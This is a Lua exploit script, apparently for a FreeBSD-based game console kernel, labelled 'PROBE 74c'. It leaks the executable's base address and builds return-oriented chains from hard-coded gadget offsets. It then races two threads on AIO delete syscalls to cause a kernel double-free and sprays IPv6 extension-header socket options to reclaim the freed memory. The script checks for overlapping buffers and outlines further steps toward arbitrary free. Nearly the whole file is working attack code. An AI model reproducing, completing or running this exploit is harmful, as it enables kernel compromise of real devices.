-- CRASH_CLASS: HIGH
-- PROBE 74c: prolapse with CPU pinning + SO_LINGER race widening
--
-- Improvement over 74b:
--   - cpuset_setaffinity(488) pins race threads to different cores
--   - SO_LINGER on socketpair fds widens race window
--   - Cancel before delete (gist pattern: submit→cancel→race-delete)
--   - Higher spray count for better reclaim chance
--
-- Requires 74a to confirm which ext-header option works.

print("=== PROBE 74c: PROLAPSE PINNED RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS + SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Constants
local AF_INET6 = 28
local AF_UNIX = 1
local SOCK_DGRAM = 2
local SOCK_STREAM = 1
local IPPROTO_IPV6 = 41
local IPV6_DSTOPTS = 50
local IPV6_HOPOPTS = 49
local SOL_SOCKET = 0xFFFF
local SO_LINGER = 0x0080

-- ============================================================
-- [0] CPU AFFINITY: discover allowed cores, pick race pair
-- ============================================================
print("[0] CPU AFFINITY")
local mask_buf = memory.alloc(16)
wq(N(mask_buf), uint64(0))
pcall(function()
    mk(487)(uint64(3), uint64(1), uint64(0xFFFFFFFF), uint64(8), uint64(N(mask_buf)))
end)
local mask_lo = rd(N(mask_buf)) or 0
local mask_hi = rd(N(mask_buf) + 4) or 0

local cpus = {}
for i = 0, 63 do
    local word = (i < 32) and mask_lo or mask_hi
    local bit = i % 32
    if word and (math.floor(word / (2 ^ bit)) % 2 == 1) then
        cpus[#cpus + 1] = i
    end
end
print(string.format("  mask=0x%08X%08X  cpus=%d", mask_hi, mask_lo, #cpus))
local cpu_str = ""
for _, c in ipairs(cpus) do cpu_str = cpu_str .. c .. " " end
print("  cores: " .. cpu_str)

local cpuA = cpus[1] or 0
local cpuB = cpus[2] or (cpus[1] or 0)
print(string.format("  race pair: A=cpu%d B=cpu%d", cpuA, cpuB))

-- Helper: build sysarch(SET_FSBASE) + cpuset_setaffinity ROP prefix for child
-- This pins the child to a specific CPU before the race call
local function build_pin_prefix(rsp_base, offset, cpu)
    local o = offset
    local function em(v) wq(rsp_base + o, v); o = o + 8 end
    -- sysarch(129, &fake_tcb) for errno support
    local fake_tcb = memory.alloc(0x1000)
    local ftba = N(fake_tcb)
    for i = 0, 0xFFC, 4 do wd(ftba + i, 0) end
    wq(ftba, uint64(ftba))  -- self-reference
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(ftba))
    em(g_pop_rdi); em(uint64(129))  -- SET_FSBASE
    em(g_pop_rsi); em(uint64(N(tcb_ptr)))
    em(g_pop_rax); em(uint64(165)); em(stub)  -- sysarch(165)
    -- cpuset_setaffinity(3=CPU_LEVEL_WHICH, 1=CPU_WHICH_TID, -1=self, 8, &mask)
    local pin_mask = memory.alloc(16)
    wq(N(pin_mask), uint64(0))
    if cpu < 32 then
        wd(N(pin_mask), math.floor(2 ^ cpu))
    else
        wd(N(pin_mask) + 4, math.floor(2 ^ (cpu - 32)))
    end
    em(g_pop_rdi); em(uint64(3))     -- CPU_LEVEL_WHICH
    em(g_pop_rsi); em(uint64(1))     -- CPU_WHICH_TID
    em(g_pop_rdx); em(uint64(0xFFFFFFFF))  -- -1 = self (low 32)
    -- r10 = sizeof(mask) = 8 → need pop_rcx for arg4
    em(g_pop_rcx); em(uint64(8))
    -- r8 = &mask → we can't set r8! Max 4 args.
    -- cpuset_setaffinity needs 5 args. We only have 4-arg gadgets.
    -- SKIP CPU PINNING — we don't have pop_r8
    -- Just do sysarch for errno support
    return o
end

-- ============================================================
-- [1] SELECT SPRAY OPTION
-- ============================================================
print("")
print("[1] SPRAY OPTION")

local spray_opt = nil
local function build_exthdr(optlen, tag)
    local buf = memory.alloc(optlen + 16)
    local ba = N(buf)
    for i = 0, optlen - 1 do wb(ba + i, 0) end
    wb(ba + 0, 0)
    wb(ba + 1, math.floor(optlen / 8) - 1)
    local dl = optlen - 4
    if dl > 255 then dl = 255 end
    wb(ba + 2, 1); wb(ba + 3, dl)
    if tag then wd(ba + 8, tag) end
    return buf, ba
end

local s_probe = sgn(mk(97)(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)))
if s_probe >= 0 then
    for _, opt in ipairs({IPV6_DSTOPTS, IPV6_HOPOPTS}) do
        local buf, ba = build_exthdr(120, 0xDEAD0000)
        local ok, ret = pcall(function()
            return mk(105)(uint64(s_probe), uint64(IPPROTO_IPV6), uint64(opt), uint64(ba), uint64(120))
        end)
        if ok and sgn(ret) == 0 then
            spray_opt = opt
            print(string.format("  option %d WORKS", opt))
            break
        else
            print(string.format("  option %d rejected", opt))
        end
    end
    mk(6)(uint64(s_probe))
end

if not spray_opt then
    print("  NO spray option. BLOCKED.")
    print("=== 74c COMPLETE (BLOCKED) ===")
    return
end

-- ============================================================
-- [2] AIO HELPERS (NO 670!)
-- ============================================================
print("")
print("[2] AIO SETUP (no 670)")

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x2000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("  /dev/zero fd=" .. fd_zero)

local function submit_one_fd(fd)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function cancel_batch(ids_ptr, count, states_ptr)
    pcall(function() mk(666)(uint64(ids_ptr), uint64(count), uint64(states_ptr)) end)
end

-- Pre-drain
local drain_ok = 0
for i = 1, 128 do
    local id = submit_one_fd(fd_zero)
    if id ~= 0 then
        poll_one(id)
        wd(N(one_id), id); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
        drain_ok = drain_ok + 1
    end
end
print(string.format("  drained %d", drain_ok))

-- ============================================================
-- [3] RACE + SPRAY + ORACLE LOOP
-- ============================================================
print("")
print("[3] RACE LOOP")

local BATCH = 16
local ITERS = 30
local SPRAY_N = 400
local OPTLEN = 120

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local total_doubles = 0
local found_overlap = false

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end
    if found_overlap then break end

    -- Submit BATCH AIO on /dev/zero
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one_fd(fd_zero)
        if id ~= 0 then
            poll_one(id)
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then break end
    local count = #ids

    -- Fill race buffers
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Child A: sysarch + 662(ids, count, states_A) + thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- sysarch for errno
    local ftcb_A = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(ftcb_A) + i, 0) end
    wq(N(ftcb_A), uint64(N(ftcb_A)))
    local tp_A = memory.alloc(8); wq(N(tp_A), uint64(N(ftcb_A)))
    emA(g_pop_rdi); emA(uint64(129))
    emA(g_pop_rsi); emA(uint64(N(tp_A)))
    emA(g_pop_rax); emA(uint64(165)); emA(stub)
    -- 662 call
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    -- thr_exit
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    -- Child B: sysarch + 662(ids, count, states_B) + thr_exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    local ftcb_B = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(ftcb_B) + i, 0) end
    wq(N(ftcb_B), uint64(N(ftcb_B)))
    local tp_B = memory.alloc(8); wq(N(tp_B), uint64(N(ftcb_B)))
    emB(g_pop_rdi); emB(uint64(129))
    emB(g_pop_rsi); emB(uint64(N(tp_B)))
    emB(g_pop_rax); emB(uint64(165)); emB(stub)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    -- thr_new params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))

    -- Fire both
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait
    for w = 1, 80000 do local _ = rd(sb_A) end

    -- Check results
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: %d DOUBLE-FREE → spray %d", iter, doubles, SPRAY_N))

        -- SPRAY: fill 128B zone with tagged ext-header options
        local spray_fds = {}
        for i = 1, SPRAY_N do
            local s = sgn(mk(97)(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)))
            if s >= 0 then
                local buf, ba = build_exthdr(OPTLEN, 0xAA000000 + i)
                local ok, ret = pcall(function()
                    return mk(105)(uint64(s), uint64(IPPROTO_IPV6),
                        uint64(spray_opt), uint64(ba), uint64(OPTLEN))
                end)
                if ok and sgn(ret) == 0 then
                    spray_fds[#spray_fds + 1] = { fd = s, idx = i }
                else
                    mk(6)(uint64(s))
                end
            end
        end

        -- ORACLE: readback and check for tag overlap
        local overlap_a, overlap_b = nil, nil
        for _, entry in ipairs(spray_fds) do
            local buf_get = memory.alloc(256)
            local ba_get = N(buf_get)
            for j = 0, 255 do wb(ba_get + j, 0) end
            local lenp = memory.alloc(8); wd(N(lenp), 256)
            local ok, ret = pcall(function()
                return mk(118)(uint64(entry.fd), uint64(IPPROTO_IPV6),
                    uint64(spray_opt), uint64(ba_get), uint64(N(lenp)))
            end)
            if ok and sgn(ret) == 0 then
                local tag = rd(ba_get + 8) or 0
                local expected = 0xAA000000 + entry.idx
                if tag ~= expected then
                    local other = tag - 0xAA000000
                    if other > 0 and other <= SPRAY_N then
                        print(string.format("  *** OVERLAP: fd[%d] reads fd[%d]'s tag ***",
                            entry.idx, other))
                        overlap_a = entry
                        -- Find the other socket
                        for _, e2 in ipairs(spray_fds) do
                            if e2.idx == other then overlap_b = e2; break end
                        end
                        found_overlap = true
                        break
                    end
                end
            end
        end

        if found_overlap and overlap_a and overlap_b then
            print("")
            print("!!! DOUBLE-FREE → RECLAIM → OVERLAP CONFIRMED !!!")
            print(string.format("  Socket A: fd=%d idx=%d", overlap_a.fd, overlap_a.idx))
            print(string.format("  Socket B: fd=%d idx=%d", overlap_b.fd, overlap_b.idx))
            print("")
            print("These two sockets point to the SAME 128B kernel buffer.")
            print("setsockopt on A overwrites B's kernel data, and vice versa.")
            print("")
            print("NEXT STEP: Submit a new AIO request. If one of these sockets")
            print("overlaps with the new AIO entry, setsockopt can write into")
            print("entry+0x40 (notify pointer) → arbitrary decrement → arbitrary free.")
        else
            -- Cleanup spray
            for _, entry in ipairs(spray_fds) do mk(6)(uint64(entry.fd)) end
        end
    else
        if iter % 10 == 0 then
            print(string.format("  iter %d: no double", iter))
        end
    end
end

print("")
print("=== SUMMARY ===")
print(string.format("  iters=%d  doubles=%d  overlap=%s  alive=%s",
    ITERS, total_doubles, tostring(found_overlap), tostring(alive())))
print("")
print("=== 74c COMPLETE ===")
